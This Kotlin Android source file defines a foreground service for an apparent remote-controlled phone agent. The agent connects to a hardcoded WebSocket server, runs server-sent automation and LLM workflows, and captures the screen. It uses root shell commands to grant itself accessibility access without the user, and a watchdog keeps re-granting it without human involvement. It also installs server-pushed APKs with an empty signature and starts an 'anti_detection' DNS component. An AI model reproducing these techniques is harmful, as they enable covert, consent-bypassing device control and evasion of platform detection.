package com.phonenetwork.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.IBinder
import android.provider.Settings
import android.util.Log
import com.phonenetwork.BuildConfig
import com.phonenetwork.accessibility.AgentAccessibilityService
import com.phonenetwork.anti_detection.DnsBackgroundService
import com.phonenetwork.automation.AutomationController
import com.phonenetwork.capture.CaptureController
import com.phonenetwork.connection.DirectWsClient
import com.phonenetwork.llm.OpenAiCompatibleClient
import com.phonenetwork.model.DeviceModelConfigClient
import com.phonenetwork.connection.WifiWatchdog
import com.phonenetwork.executor.JobExecutor
import com.phonenetwork.health.HealthMonitor
import com.phonenetwork.ota.OtaInstaller
import com.phonenetwork.workflow.WorkflowEngine
import com.phonenetwork.utils.BoundedProcessRunner
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import org.json.JSONObject

/**
 * AgentForegroundService — sticky foreground service, owns all agent components.
 * Uses DirectWs only (no Nostr).
 *
 * Lifecycle:
 *   onCreate()        → create NotificationChannel
 *   onStartCommand()  → startForeground, init components, connect DirectWs
 *   onDestroy()       → disconnect DirectWs, stop DNS, cancel scope
 */
class AgentForegroundService : Service() {

    companion object {
        const val NOTIFICATION_ID = 1001
        const val CHANNEL_ID      = "phone_network_agent"
        const val CHANNEL_NAME    = "Phone Network Agent"
        private const val TAG     = "PhoneNet/FgService"
        private const val OTA_STATUS_PREFS = "phone_network_ota_status"
        private const val PENDING_OTA_ATTEMPT = "pending_ota_attempt"
        private const val PENDING_OTA_RESULT = "pending_ota_result"
        private const val OTA_ATTEMPT_STALE_MS = 15 * 60 * 1_000L

        @Volatile var instance: AgentForegroundService? = null

        fun start(context: Context) {
            val intent = Intent(context, AgentForegroundService::class.java)
            context.startForegroundService(intent)
        }

        fun stop(context: Context) {
            val intent = Intent(context, AgentForegroundService::class.java)
            context.stopService(intent)
        }

        fun registerAccessibilityService(svc: AgentAccessibilityService) {
            pendingA11y = svc
            instance?.onAccessibilityServiceConnected(svc)
        }

        fun unregisterAccessibilityService(svc: AgentAccessibilityService) {
            if (pendingA11y === svc) pendingA11y = null
            instance?.onAccessibilityServiceDisconnected(svc)
        }

        fun requestAccessibilityRecovery() {
            instance?.requestAccessibilityRecoveryNow()
        }

        var pendingA11y: AgentAccessibilityService? = null
    }

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    private lateinit var captureCtrl:    CaptureController
    private lateinit var healthMonitor:  HealthMonitor
    private lateinit var otaInstaller:   OtaInstaller
    private lateinit var automation:      AutomationController
    private lateinit var jobExecutor:     JobExecutor
    private          var directWsClient: DirectWsClient? = null
    private lateinit var wifiWatchdog:    WifiWatchdog
    @Volatile private var connectedA11y: AgentAccessibilityService? = null
    @Volatile private var lastA11yRecoveryAt = 0L
    @Volatile private var started = false

    override fun onCreate() {
        super.onCreate()
        instance = this
        Log.i(TAG, "Service created")
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.i(TAG, "Service starting (startId=$startId)")

        startForeground(NOTIFICATION_ID, buildNotification("Connecting…"))

        // Boot receiver, launcher recovery alarm and START_STICKY can all arrive
        // together after OTA. Initialize the executor/watchdogs exactly once.
        if (started) {
            Log.i(TAG, "Service already initialized; ignoring duplicate start")
            return START_STICKY
        }
        started = true

        initComponents()
        DnsBackgroundService.start(serviceScope)

        wifiWatchdog = WifiWatchdog(applicationContext, serviceScope) { _ ->
            // HealthMonitor sends via DirectWs heartbeat automatically
        }
        wifiWatchdog.start()

        enableAccessibilityServiceViaRoot()
        pendingA11y?.let { onAccessibilityServiceConnected(it) }

        // Retry accessibility enablement after delay (system may not pick up secure settings immediately)
        serviceScope.launch {
            delay(3000)
            if (pendingA11y == null) {
                Log.w(TAG, "A11y not connected after 3s — retrying enablement")
                enableAccessibilityServiceViaRoot(forceRebind = true)
            }
        }

        // Accessibility may be killed independently while the foreground process and
        // DirectWs stay healthy. Keep this watchdog local so recovery never requires a
        // server release, device reboot, force-stop, or human intervention.
        serviceScope.launch {
            while (isActive) {
                delay(10_000)
                if (connectedA11y == null || pendingA11y == null) {
                    val now = System.currentTimeMillis()
                    if (now - lastA11yRecoveryAt >= 20_000L) {
                        lastA11yRecoveryAt = now
                        Log.w(TAG, "A11y watchdog detected disconnect — forcing bounded rebind")
                        enableAccessibilityServiceViaRoot(forceRebind = true)
                    }
                }
            }
        }

        // Configure DirectWs auto-discovery
        Log.i(TAG, "Configuring DirectWs auto-discovery")
        val prefs = applicationContext.getSharedPreferences("phone_network_direct", Context.MODE_PRIVATE)
        prefs.edit()
            .putString("direct_ws_url", "ws://enkzoned.go.ro:3000/ws-direct")
            .putString("direct_ws_device_key", "")
            .putBoolean("direct_ws_enabled", true)
            .apply()

        // Start DirectWs transport
        serviceScope.launch {
            try {
                val modelConfigClient = DeviceModelConfigClient(applicationContext)
                val llmClient = OpenAiCompatibleClient(modelConfigClient)
                val dwc = DirectWsClient(
                    context    = applicationContext,
                    executor   = jobExecutor,
                    scope      = serviceScope,
                    onConnected = { deviceId ->
                        Log.i(TAG, "DirectWs connected: deviceId=$deviceId")
                        updateNotification("Connected (DirectWs)")
                        flushPendingOtaResult()
                        reconcileInterruptedOtaAttempt()
                    },
                    onDisconnected = {
                        Log.i(TAG, "DirectWs disconnected")
                        updateNotification("Disconnected — reconnecting…")
                    },
                    onModelConfigUpdated = {
                        serviceScope.launch {
                            modelConfigClient.invalidate()
                            runCatching { modelConfigClient.getConfig(forceRefresh = true) }
                                .onFailure { Log.w(TAG, "Model config refresh failed: ${it.message}") }
                        }
                    },
                    onOtaUpdate = { version, versionCode, apkUrl, apkSha256, mandatory ->
                        Log.i(TAG, "OTA update available: $version (code=$versionCode)")
                        updateNotification("Downloading update $version…")
                        beginOtaAttempt(version, versionCode, apkSha256)
                        sendOtaResult(false, false, version, versionCode, apkSha256, null)
                        serviceScope.launch {
                            try {
                                val result = otaInstaller.downloadVerifyInstall(
                                    apkUrl          = apkUrl,
                                    expectedSha256   = apkSha256,
                                    signature        = "",
                                    versionCode      = versionCode,
                                    forceDowngrade   = false
                                )
                                Log.i(TAG, "OTA update result: $result")
                                sendOtaResult(true, true, version, versionCode, apkSha256, null)
                                updateNotification("Update applied — restart to activate")
                            } catch (e: Exception) {
                                Log.e(TAG, "OTA update error: ${e.message}")
                                sendOtaResult(true, false, version, versionCode, apkSha256, e.message)
                                updateNotification("Update failed")
                            }
                        }
                    },
                )
                directWsClient = dwc

                // Initialize WorkflowEngine for edge execution (ADR-001)
                val workflowEngine = WorkflowEngine(
                    context = applicationContext,
                    automation = automation,
                    capture = captureCtrl,
                    jobExecutor = jobExecutor,
                    sendStatus = { statusJson ->
                        dwc.sendRaw(statusJson)
                    },
                    requestLLM = { prompt, screenshot, model ->
                        llmClient.complete(prompt, screenshot, model)
                    }
                )
                dwc.setWorkflowEngine(workflowEngine)
                Log.i(TAG, "WorkflowEngine initialized and attached")

                dwc.connect()
                Log.i(TAG, "DirectWsClient started")
            } catch (e: Exception) {
                Log.e(TAG, "DirectWsClient failed: ${e.message}")
            }
        }

        return START_STICKY
    }

    override fun onDestroy() {
        Log.i(TAG, "Service stopping")
        started = false
        instance = null
        directWsClient?.disconnect()
        if (::wifiWatchdog.isInitialized)  wifiWatchdog.stop()
        DnsBackgroundService.stop()
        serviceScope.cancel()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    @Synchronized
    private fun enableAccessibilityServiceViaRoot(forceRebind: Boolean = false) {
        if (forceRebind) lastA11yRecoveryAt = System.currentTimeMillis()
        val component = "$packageName/${AgentAccessibilityService::class.java.name}"
        try {
            val current = Settings.Secure.getString(
                contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: ""
            Log.i(TAG, "A11y: current services='$current', target='$component'")
            if (component in current && !forceRebind) {
                Log.i(TAG, "A11y service already enabled")
                return
            }
            // Clean approach: use separate su commands to avoid shell quoting issues
            // First, build the new list (keep existing non-conflicting services)
            val parts = current.split(":").filter { it.isNotEmpty() }.toMutableList()
            // Remove old package references (com.phonenetwork.debug or com.phonenetwork)
            val oldPrefixes = listOf("com.phonenetwork.debug/", "com.phonenetwork/")
            parts.removeAll { part -> oldPrefixes.any { prefix -> part.startsWith(prefix) } }
            val withoutTarget = parts.joinToString(":")
            parts.add(component)
            val newList = parts.joinToString(":")
            Log.i(TAG, "A11y: setting services='$newList'")

            // Use separate commands to avoid quoting issues with su -c
            val cmd1 = "settings put secure enabled_accessibility_services $newList"
            val cmd2 = "settings put secure accessibility_enabled 1"
            if (forceRebind && component in current) {
                // Android 10 may ignore a 0→1 toggle while the component list is
                // unchanged. Remove the dead binding first, then restore the exact list.
                runRootCommand("settings put secure accessibility_enabled 0")
                if (withoutTarget.isEmpty()) {
                    runRootCommand("settings delete secure enabled_accessibility_services")
                } else {
                    runRootCommand("settings put secure enabled_accessibility_services $withoutTarget")
                }
                Thread.sleep(300)
            }
            runRootCommand(cmd1)
            runRootCommand(cmd2)

            // Verify it was set
            Thread.sleep(500)
            val verify = Settings.Secure.getString(
                contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: ""
            if (component in verify) {
                Log.i(TAG, "A11y: VERIFIED service enabled")
            } else {
                Log.w(TAG, "A11y: VERIFICATION FAILED — got='$verify'")
            }
        } catch (e: Exception) {
            Log.w(TAG, "Failed to enable a11y via root: ${e.message}")
        }
    }

    private fun runRootCommand(cmd: String): Int {
        return try {
            val result = BoundedProcessRunner.runBlocking(arrayOf("su", "-c", cmd), 10_000L)
            Log.i(TAG, "root command exit=${result.exitCode} timeout=${result.timedOut}")
            result.exitCode ?: -1
        } catch (e: Exception) {
            Log.w(TAG, "root command exception: ${e.message}")
            -1
        }
    }

    private fun sendOtaResult(
        terminal: Boolean,
        successful: Boolean,
        version: String,
        versionCode: Int,
        apkSha256: String,
        error: String?
    ) {
        val payload = JSONObject().apply {
            put("type", "OTA_RESULT")
            put("terminal", terminal)
            put("successful", successful)
            put("version", version)
            put("versionCode", versionCode)
            put("apkSha256", apkSha256)
            if (error != null) put("error", error)
        }
        val prefs = getSharedPreferences(OTA_STATUS_PREFS, Context.MODE_PRIVATE)
        if (terminal) {
            prefs.edit()
                .putString(PENDING_OTA_RESULT, payload.toString())
                .remove(PENDING_OTA_ATTEMPT)
                .commit()
        }
        if (directWsClient?.sendRaw(payload) == true && terminal) {
            prefs.edit().remove(PENDING_OTA_RESULT).apply()
        }
    }

    private fun beginOtaAttempt(version: String, versionCode: Int, apkSha256: String) {
        val attempt = JSONObject().apply {
            put("version", version)
            put("versionCode", versionCode)
            put("apkSha256", apkSha256)
            put("startedAt", System.currentTimeMillis())
        }
        getSharedPreferences(OTA_STATUS_PREFS, Context.MODE_PRIVATE)
            .edit()
            .remove(PENDING_OTA_RESULT)
            .putString(PENDING_OTA_ATTEMPT, attempt.toString())
            .commit()
    }

    private fun flushPendingOtaResult() {
        val prefs = getSharedPreferences(OTA_STATUS_PREFS, Context.MODE_PRIVATE)
        val raw = prefs.getString(PENDING_OTA_RESULT, null) ?: return
        val payload = runCatching { JSONObject(raw) }.getOrNull() ?: run {
            prefs.edit().remove(PENDING_OTA_RESULT).apply()
            return
        }
        if (directWsClient?.sendRaw(payload) == true) {
            prefs.edit().remove(PENDING_OTA_RESULT).apply()
        }
    }

    private fun reconcileInterruptedOtaAttempt() {
        val prefs = getSharedPreferences(OTA_STATUS_PREFS, Context.MODE_PRIVATE)
        val raw = prefs.getString(PENDING_OTA_ATTEMPT, null) ?: return
        val attempt = runCatching { JSONObject(raw) }.getOrNull() ?: run {
            prefs.edit().remove(PENDING_OTA_ATTEMPT).apply()
            return
        }
        val version = attempt.optString("version")
        val versionCode = attempt.optInt("versionCode", 0)
        val apkSha256 = attempt.optString("apkSha256")
        val startedAt = attempt.optLong("startedAt", 0L)

        when {
            versionCode > 0 && BuildConfig.VERSION_CODE == versionCode -> {
                sendOtaResult(true, true, version, versionCode, apkSha256, null)
            }
            startedAt > 0L && System.currentTimeMillis() - startedAt >= OTA_ATTEMPT_STALE_MS -> {
                sendOtaResult(
                    true,
                    false,
                    version,
                    versionCode,
                    apkSha256,
                    "OTA process ended without installing the requested version",
                )
            }
        }
    }

    private fun initComponents() {
        val ctx = applicationContext

        captureCtrl    = CaptureController()
        healthMonitor  = HealthMonitor(ctx)
        otaInstaller   = OtaInstaller(ctx)
        automation     = AutomationController(service = null)

        jobExecutor = JobExecutor(
            context      = ctx,
            automation   = automation,
            capture      = captureCtrl,
            otaInstaller = otaInstaller,
        )
    }

    private fun onAccessibilityServiceConnected(svc: AgentAccessibilityService) {
        Log.i(TAG, "AccessibilityService connected")
        connectedA11y = svc
        if (::jobExecutor.isInitialized) {
            jobExecutor.setAccessibilityService(svc)
            automation = AutomationController(service = svc)
            jobExecutor.setAutomationController(automation)
            Log.i(TAG, "AutomationController wired to A11yService")
        }
        updateNotification("Connected")
    }

    private fun onAccessibilityServiceDisconnected(svc: AgentAccessibilityService) {
        if (connectedA11y !== svc) return
        connectedA11y = null
        if (::jobExecutor.isInitialized) {
            jobExecutor.clearAccessibilityService()
            automation = AutomationController(service = null)
            jobExecutor.setAutomationController(automation)
        }
        updateNotification("Accessibility reconnecting…")
        requestAccessibilityRecoveryNow()
    }

    private fun requestAccessibilityRecoveryNow() {
        serviceScope.launch {
            val now = System.currentTimeMillis()
            if (now - lastA11yRecoveryAt < 2_000L) return@launch
            lastA11yRecoveryAt = now
            enableAccessibilityServiceViaRoot(forceRebind = true)
        }
    }

    private fun createNotificationChannel() {
        val channel = NotificationChannel(
            CHANNEL_ID,
            CHANNEL_NAME,
            NotificationManager.IMPORTANCE_LOW
        ).apply {
            description = "Phone Network Agent"
            setShowBadge(false)
        }
        (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
            .createNotificationChannel(channel)
    }

    fun updateNotification(status: String) {
        (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
            .notify(NOTIFICATION_ID, buildNotification(status))
    }

    private fun buildNotification(status: String): Notification =
        Notification.Builder(this, CHANNEL_ID)
            .setContentTitle("Phone Network Agent")
            .setContentText(status)
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setOngoing(true)
            .setShowWhen(false)
            .build()
}
